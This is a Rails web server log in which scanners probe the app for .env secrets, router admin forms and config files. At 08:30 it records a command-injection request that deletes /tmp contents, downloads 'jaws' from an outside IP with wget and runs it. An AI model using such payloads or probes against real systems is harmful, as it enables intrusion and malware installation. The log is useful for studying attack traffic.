# Logfile created on 2023-01-25 00:11:59 +0900 by logger.rb/v1.5.0
I, [2023-01-25T00:11:59.676046 #1791623]  INFO -- : Started POST "/boaform/admin/formLogin" for 179.43.177.242 at 2023-01-25 00:11:59 +0900
F, [2023-01-25T00:11:59.678850 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/boaform/admin/formLogin"):
  
I, [2023-01-25T00:51:20.367652 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 00:51:20 +0900
I, [2023-01-25T00:51:20.368355 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T00:51:20.368395 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T00:51:20.369047 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T00:51:20.370971 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.0ms | Allocations: 299)
I, [2023-01-25T00:51:20.371190 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 2.4ms | Allocations: 521)
I, [2023-01-25T00:51:20.907035 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 00:51:20 +0900
F, [2023-01-25T00:51:20.907513 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T01:04:11.514113 #1791621]  INFO -- : Started GET "/" for 198.235.24.34 at 2023-01-25 01:04:11 +0900
I, [2023-01-25T01:04:11.514795 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T01:04:11.515434 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-01-25T01:04:11.516229 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T01:04:11.516546 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 512)
I, [2023-01-25T01:22:17.338529 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 01:22:17 +0900
I, [2023-01-25T01:22:17.339172 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T01:22:17.339216 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T01:22:17.339633 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T01:22:17.340257 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T01:22:17.340579 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-25T01:22:19.019894 #1791621]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 01:22:19 +0900
F, [2023-01-25T01:22:19.020232 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T01:33:41.128125 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 01:33:41 +0900
I, [2023-01-25T01:33:41.128740 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T01:33:41.128781 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T01:33:41.129457 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T01:33:41.130362 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T01:33:41.130560 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 521)
I, [2023-01-25T01:33:41.674977 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 01:33:41 +0900
F, [2023-01-25T01:33:41.675930 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T01:43:49.610186 #1791621]  INFO -- : Started GET "/" for 146.190.252.127 at 2023-01-25 01:43:49 +0900
I, [2023-01-25T01:43:49.610906 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T01:43:49.611475 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-01-25T01:43:49.612441 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-01-25T01:43:49.613394 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 513)
I, [2023-01-25T02:30:16.883690 #1791621]  INFO -- : Started GET "/.env" for 109.237.97.180 at 2023-01-25 02:30:16 +0900
I, [2023-01-25T02:30:16.884333 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T02:30:16.884377 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T02:30:16.884803 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T02:30:16.885475 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T02:30:16.885660 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T02:48:25.180706 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-25 02:48:25 +0900
I, [2023-01-25T02:48:25.181498 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T02:48:25.181554 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T02:48:25.182256 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T02:48:25.183108 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T02:48:25.183317 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 523)
I, [2023-01-25T02:48:25.795161 #1791623]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-25 02:48:25 +0900
F, [2023-01-25T02:48:25.795726 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T03:10:12.900926 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 03:10:12 +0900
I, [2023-01-25T03:10:12.901568 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T03:10:12.901611 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T03:10:12.902042 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T03:10:12.902674 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T03:10:12.902859 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T03:10:13.453010 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 03:10:13 +0900
F, [2023-01-25T03:10:13.453416 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T03:14:33.526683 #1791623]  INFO -- : Started GET "/" for 77.237.72.15 at 2023-01-25 03:14:33 +0900
I, [2023-01-25T03:14:33.527449 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T03:14:33.527891 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T03:14:33.528645 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-25T03:14:33.528818 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 513)
I, [2023-01-25T03:14:33.536182 #1791621]  INFO -- : Started GET "/" for 77.237.72.15 at 2023-01-25 03:14:33 +0900
I, [2023-01-25T03:14:33.537480 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T03:14:33.539569 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T03:14:33.541591 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.1ms | Allocations: 299)
I, [2023-01-25T03:14:33.541778 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.4ms | Allocations: 514)
I, [2023-01-25T04:18:54.615655 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-25 04:18:54 +0900
I, [2023-01-25T04:18:54.616679 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T04:18:54.616741 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T04:18:54.617203 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T04:18:54.618249 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-01-25T04:18:54.618426 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-01-25T04:18:55.272476 #1791623]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-25 04:18:55 +0900
F, [2023-01-25T04:18:55.272800 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T04:44:03.600940 #1791623]  INFO -- : Started GET "/" for 92.118.39.82 at 2023-01-25 04:44:03 +0900
I, [2023-01-25T04:44:03.601939 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T04:44:03.602398 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T04:44:03.603994 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-01-25T04:44:03.605094 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 2.6ms | Allocations: 513)
I, [2023-01-25T05:17:16.961566 #1791623]  INFO -- : Started POST "/boaform/admin/formLogin" for 45.61.186.176 at 2023-01-25 05:17:16 +0900
F, [2023-01-25T05:17:16.961915 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/boaform/admin/formLogin"):
  
I, [2023-01-25T05:36:37.087386 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 05:36:37 +0900
I, [2023-01-25T05:36:37.087992 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T05:36:37.088032 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T05:36:37.088459 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T05:36:37.089418 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T05:36:37.089637 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-01-25T05:36:37.617663 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 05:36:37 +0900
F, [2023-01-25T05:36:37.618011 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T06:13:54.527932 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 06:13:54 +0900
I, [2023-01-25T06:13:54.528797 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T06:13:54.528844 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T06:13:54.529426 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T06:13:54.530065 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T06:13:54.530346 #1791621]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-01-25T06:13:56.154032 #1791623]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 06:13:56 +0900
F, [2023-01-25T06:13:56.154527 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T06:29:02.686232 #1791623]  INFO -- : Started GET "/" for 77.247.30.61 at 2023-01-25 06:29:02 +0900
I, [2023-01-25T06:29:02.686888 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T06:29:02.687333 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T06:29:02.687987 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T06:29:02.688169 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-01-25T07:06:33.030804 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 07:06:33 +0900
I, [2023-01-25T07:06:33.031701 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T07:06:33.031748 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T07:06:33.032195 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T07:06:33.033949 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.8ms | Allocations: 299)
I, [2023-01-25T07:06:33.034146 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 2.1ms | Allocations: 521)
I, [2023-01-25T07:06:33.577096 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 07:06:33 +0900
F, [2023-01-25T07:06:33.577417 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T07:11:49.790009 #1791621]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.173.181 at 2023-01-25 07:11:49 +0900
I, [2023-01-25T07:11:49.790627 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T07:11:49.790765 #1791621]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-01-25T07:11:49.791281 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T07:11:49.792472 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.2ms | Allocations: 299)
I, [2023-01-25T07:11:49.792691 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 505)
I, [2023-01-25T08:02:13.924501 #1791621]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 08:02:13 +0900
I, [2023-01-25T08:02:13.925263 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T08:02:13.925313 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T08:02:13.925742 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T08:02:13.926393 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T08:02:13.927477 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
I, [2023-01-25T08:02:14.464764 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 08:02:14 +0900
F, [2023-01-25T08:02:14.465240 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T08:30:06.535455 #1791621]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws" for 175.182.227.199 at 2023-01-25 08:30:06 +0900
I, [2023-01-25T08:30:06.536235 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T08:30:06.536293 #1791621]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 94.158.247.123/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-01-25T08:30:06.536716 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T08:30:06.538247 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-01-25T08:30:06.540321 #1791621]  INFO -- : Completed 200 OK in 4ms (Views: 1.9ms | Allocations: 513)
I, [2023-01-25T08:37:31.215113 #1791621]  INFO -- : Started GET "/" for 66.240.236.116 at 2023-01-25 08:37:31 +0900
I, [2023-01-25T08:37:31.215726 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T08:37:31.216238 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T08:37:31.217413 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.2ms | Allocations: 299)
I, [2023-01-25T08:37:31.217707 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.6ms | Allocations: 521)
I, [2023-01-25T08:57:23.115058 #1791621]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-01-25 08:57:23 +0900
I, [2023-01-25T08:57:23.115741 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T08:57:23.115872 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T08:57:23.116388 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T08:57:23.118075 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.8ms | Allocations: 299)
I, [2023-01-25T08:57:23.118429 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 2.3ms | Allocations: 521)
I, [2023-01-25T08:57:23.877142 #1791623]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-01-25 08:57:23 +0900
F, [2023-01-25T08:57:23.877585 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T09:25:03.162386 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 09:25:03 +0900
I, [2023-01-25T09:25:03.163025 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T09:25:03.163071 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T09:25:03.163521 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T09:25:03.164190 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-01-25T09:25:03.164406 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-01-25T09:25:03.734835 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 09:25:03 +0900
F, [2023-01-25T09:25:03.735182 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T09:48:53.967774 #1791621]  INFO -- : Started GET "/druid/index.html" for 192.241.237.24 at 2023-01-25 09:48:53 +0900
I, [2023-01-25T09:48:53.968561 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T09:48:53.968609 #1791621]  INFO -- :   Parameters: {"all"=>"druid/index"}
I, [2023-01-25T09:48:53.969068 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T09:48:53.970265 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.2ms | Allocations: 299)
I, [2023-01-25T09:48:53.970579 #1791621]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 510)
I, [2023-01-25T10:45:36.507464 #1791621]  INFO -- : Started GET "/" for 103.29.71.244 at 2023-01-25 10:45:36 +0900
I, [2023-01-25T10:45:36.508131 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T10:45:36.508674 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T10:45:36.510762 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.1ms | Allocations: 299)
I, [2023-01-25T10:45:36.511565 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 3.1ms | Allocations: 521)
I, [2023-01-25T11:03:01.468675 #1791623]  INFO -- : Started POST "/GponForm/diag_Form?images/" for 115.49.208.111 at 2023-01-25 11:03:01 +0900
F, [2023-01-25T11:03:01.469126 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/GponForm/diag_Form"):
  
I, [2023-01-25T11:07:21.763418 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 11:07:21 +0900
I, [2023-01-25T11:07:21.764178 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T11:07:21.764229 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T11:07:21.764767 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T11:07:21.765579 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T11:07:21.766420 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.8ms | Allocations: 521)
I, [2023-01-25T11:07:22.304756 #1791621]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 11:07:22 +0900
F, [2023-01-25T11:07:22.305307 #1791621] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T11:29:50.574151 #1791621]  INFO -- : Started GET "/config/getuser?index=0" for 185.225.74.247 at 2023-01-25 11:29:50 +0900
I, [2023-01-25T11:29:50.575015 #1791621]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T11:29:50.575123 #1791621]  INFO -- :   Parameters: {"index"=>"0", "all"=>"config/getuser"}
I, [2023-01-25T11:29:50.576449 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T11:29:50.579457 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.1ms | Allocations: 299)
I, [2023-01-25T11:29:50.580237 #1791621]  INFO -- : Completed 200 OK in 4ms (Views: 4.0ms | Allocations: 513)
I, [2023-01-25T12:22:25.374653 #1791621]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-01-25 12:22:25 +0900
I, [2023-01-25T12:22:25.375424 #1791621]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T12:22:25.375593 #1791621]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T12:22:25.376728 #1791621]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T12:22:25.378165 #1791621]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.5ms | Allocations: 299)
I, [2023-01-25T12:22:25.378362 #1791621]  INFO -- : Completed 200 OK in 3ms (Views: 2.2ms | Allocations: 521)
I, [2023-01-25T12:22:25.948581 #1791623]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-01-25 12:22:25 +0900
F, [2023-01-25T12:22:25.948951 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T12:46:52.264205 #1791623]  INFO -- : Started GET "/.env" for 135.125.217.54 at 2023-01-25 12:46:52 +0900
I, [2023-01-25T12:46:52.264986 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T12:46:52.265033 #1791623]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-01-25T12:46:52.265558 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T12:46:52.267979 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.5ms | Allocations: 299)
I, [2023-01-25T12:46:52.268572 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 3.2ms | Allocations: 521)
I, [2023-01-25T12:46:52.807523 #1791623]  INFO -- : Started POST "/" for 135.125.217.54 at 2023-01-25 12:46:52 +0900
F, [2023-01-25T12:46:52.807866 #1791623] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-01-25T12:52:08.721551 #1791623]  INFO -- : Started GET "/" for 176.241.90.173 at 2023-01-25 12:52:08 +0900
I, [2023-01-25T12:52:08.722442 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T12:52:08.723193 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T12:52:08.723856 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T12:52:08.724419 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 513)
I, [2023-01-25T13:05:53.771065 #1791623]  INFO -- : Started GET "/" for 64.225.65.187 at 2023-01-25 13:05:53 +0900
I, [2023-01-25T13:05:53.771776 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T13:05:53.772655 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T13:05:53.773570 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-01-25T13:05:53.774493 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 1.3ms | Allocations: 521)
I, [2023-01-25T13:07:20.956968 #1791623]  INFO -- : Started GET "/" for 103.149.192.183 at 2023-01-25 13:07:20 +0900
I, [2023-01-25T13:07:20.957563 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T13:07:20.958018 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T13:07:20.958919 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-01-25T13:07:20.959104 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-01-25T13:32:19.029060 #1791623]  INFO -- : Started GET "/" for 198.235.24.24 at 2023-01-25 13:32:19 +0900
I, [2023-01-25T13:32:19.029673 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T13:32:19.030120 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T13:32:19.030924 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-01-25T13:32:19.031225 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-01-25T13:57:22.538306 #1791623]  INFO -- : Started GET "/admin/config.php" for 185.224.128.219 at 2023-01-25 13:57:22 +0900
I, [2023-01-25T13:57:22.538896 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T13:57:22.538936 #1791623]  INFO -- :   Parameters: {"all"=>"admin/config"}
I, [2023-01-25T13:57:22.539358 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T13:57:22.539970 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-01-25T13:57:22.540161 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-01-25T14:11:47.661403 #1791623]  INFO -- : Started GET "/" for 79.120.54.194 at 2023-01-25 14:11:47 +0900
I, [2023-01-25T14:11:47.662032 #1791623]  INFO -- : Processing by UserController#index as HTML
I, [2023-01-25T14:11:47.662459 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:11:47.663094 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-01-25T14:11:47.663263 #1791623]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 512)
I, [2023-01-25T14:29:11.177561 #1791623]  INFO -- : Started GET "/" for 107.170.242.12 at 2023-01-25 14:29:11 +0900
I, [2023-01-25T14:29:11.178265 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T14:29:11.179078 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:29:11.181219 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.2ms | Allocations: 299)
I, [2023-01-25T14:29:11.181446 #1791623]  INFO -- : Completed 200 OK in 3ms (Views: 2.5ms | Allocations: 521)
I, [2023-01-25T14:30:46.459921 #1791623]  INFO -- : Started GET "/" for 185.180.143.8 at 2023-01-25 14:30:46 +0900
I, [2023-01-25T14:30:46.460786 #1791623]  INFO -- : Processing by UserController#index as */*
I, [2023-01-25T14:30:46.461995 #1791623]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-01-25T14:30:46.462922 #1791623]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-01-25T14:30:46.463126 #1791623]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 521)
